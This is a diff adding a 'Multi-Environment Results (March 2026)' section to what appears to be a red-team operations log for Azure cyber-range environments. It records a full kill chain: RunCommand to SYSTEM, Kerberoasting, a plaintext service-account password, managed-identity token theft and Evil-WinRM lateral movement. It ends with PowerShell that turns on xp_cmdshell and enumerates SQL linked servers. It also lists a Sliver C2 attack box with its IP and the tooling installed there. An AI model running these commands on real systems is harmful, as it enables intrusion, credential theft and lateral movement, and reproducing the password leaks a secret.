@@ -759,3 +759,100 @@ Get-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName $vm | ForEach-Obje
 ```
 
 **Note**: Max 25 RunCommands per VM. Delete old ones or Azure will reject new ones.
+
+## Multi-Environment Results (March 2026)
+
+### Environments
+| Env | Tenant | Subscription | SP Token | Status |
+|-----|--------|-------------|----------|--------|
+| RCCE2 | 03bbaf8b (rcce2.mscyberlab.com) | 5152d66b | SP:ff1e0fc8 | ✅ FULL LATERAL |
+| SiteA | 527c0d4b (sitea.everlinesystems.com) | a985babf | SP:9d1e53c7 | ⚠️ Different password |
+| RCCE | 146ea19f (rcce.mscyberlab.com) | 1336b602 | SP:2df2b8ab | ❌ DC broken |
+
+### RCCE2 — Full Kill Chain Proven (httpserver RunCommand ONLY)
+```
+RunCommand on blueHttpServer → SYSTEM
+  [1] DC online, Domain Admins: adm.contoso, azureuser
+  [2] SPNs: MSSQLSvc/blueDBServer.contoso.range:1433, :SQLEXPRESS, :50101
+  [3] Ports open: 1433 ✅, 3389 ✅, 5985 ✅ (135, 445 closed)
+  [4] Kerberoast: svc.mssql TGS captured
+  [5] KeyVault: MI tokens acquired but subscription query malformed
+  [6] WinRM lateral with known password GY2W*%m!P%0HK → SUCCESS
+      → contoso\svc.mssql on blueDBServer
+      → SQL sysadmin, DBs: master/tempdb/model/msdb/AdventureWorks
+      → Local admins: azureuser, CONTOSO\Domain Admins, svcbackup
+```
+
+### SiteA — Partial (password differs)
+```
+RunCommand on blueHttpServer → SYSTEM
+  [1] DC online, kerberoast succeeded
+  [2] Ports: all still closed from httpserver (firewall GPO deployed but may not have propagated)
+  [3] KeyVault: kvBlueRangeSecrets + kvBlobSecrets discovered but private endpoint only
+  [4] MI vault token acquired but no vault read permission
+  [5] Known RCCE2 password DOES NOT WORK in SiteA
+  [6] Need to access KeyVault from inside VNet via RunCommand on httpserver
+```
+
+### RCCE — Dead
+```
+  DC completely offline, no domain services
+  All ports to dbserver closed
+  No DNS resolution, no kerberoast possible
+  MI failed: management.azure.com not resolvable (no internet)
+```
+
+### Key Findings
+1. **svc.mssql password differs per environment** — don't assume RCCE2 password works elsewhere
+2. **KeyVaults use private endpoints** — must access from VNet (httpserver RunCommand), not externally
+3. **RunCommand queue management is critical** — max 25 per VM, deletions take 5-15 minutes
+4. **Evil-WinRM / Invoke-Command is the lateral move path** — port 5985 must be open
+5. **SP cert tokens auto-refresh via Meatball** — refresh_token field contains `SP_CERT:` prefix
+
+### Tools Installed on Attack Box (20.96.91.180)
+- **Sliver C2** v1.5.43 — mTLS on 8082+8888, daemon on 31337
+- **evil-winrm** v3.9 — `~/.local/share/gem/ruby/3.2.0/bin/evil-winrm`
+- **impacket** — secretsdump.py, smbclient.py at /usr/local/bin/
+- **netexec** (nxc) — /usr/local/bin/nxc
+- **Meatball** on port 9999 — token management, SP cert refresh
+
+### Deploy Scripts
+Created in `/home/mgstate1/sliver-new/deploy-scripts/`:
+- `one-liner.txt` — Copy-paste RunCommand deployment commands per environment
+- `lateral-winrm.ps1` — Kerberoast + WinRM lateral move script
+- `kv-extract.ps1` — KeyVault secret extraction script
+
+### Lateral Movement via Evil-WinRM (from Sliver SOCKS or direct)
+```bash
+# From httpserver nc shell (PowerShell Invoke-Command):
+$cred = New-Object PSCredential('contoso\svc.mssql', (ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force))
+Invoke-Command -ComputerName blueDBServer -Credential $cred -ScriptBlock { whoami; hostname }
+
+# Interactive session:
+$sess = New-PSSession -ComputerName blueDBServer -Credential $cred
+Enter-PSSession $sess
+
+# From attack box via Sliver SOCKS proxy:
+# sliver> socks5 start -p 1080
+# proxychains evil-winrm -i 10.1.0.100 -u 'contoso\svc.mssql' -p 'PASSWORD'
+
+# From attack box with evil-winrm directly (if route exists):
+evil-winrm -i 10.1.0.100 -u 'svc.mssql' -p 'PASSWORD'
+```
+
+### Actions on DBServer (post-lateral move)
+```powershell
+# SQL enumeration
+$c = New-Object System.Data.SqlClient.SqlConnection
+$c.ConnectionString = 'Server=localhost;Integrated Security=True'
+$c.Open()
+# List databases
+$cmd = $c.CreateCommand(); $cmd.CommandText = 'SELECT name FROM sys.databases'; $rd = $cmd.ExecuteReader(); while($rd.Read()){$rd[0]}; $rd.Close()
+# Check sysadmin
+$cmd2 = $c.CreateCommand(); $cmd2.CommandText = "SELECT IS_SRVROLEMEMBER('sysadmin')"; $cmd2.ExecuteScalar()
+# xp_cmdshell (if sysadmin)
+$cmd3 = $c.CreateCommand(); $cmd3.CommandText = "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"; $cmd3.ExecuteNonQuery()
+$cmd4 = $c.CreateCommand(); $cmd4.CommandText = "EXEC xp_cmdshell 'whoami'"; $rd4 = $cmd4.ExecuteReader(); while($rd4.Read()){$rd4[0]}
+# Linked servers
+$cmd5 = $c.CreateCommand(); $cmd5.CommandText = 'SELECT name, data_source FROM sys.servers WHERE is_linked=1'; $rd5 = $cmd5.ExecuteReader(); while($rd5.Read()){"$($rd5[0]) -> $($rd5[1])"}
+```
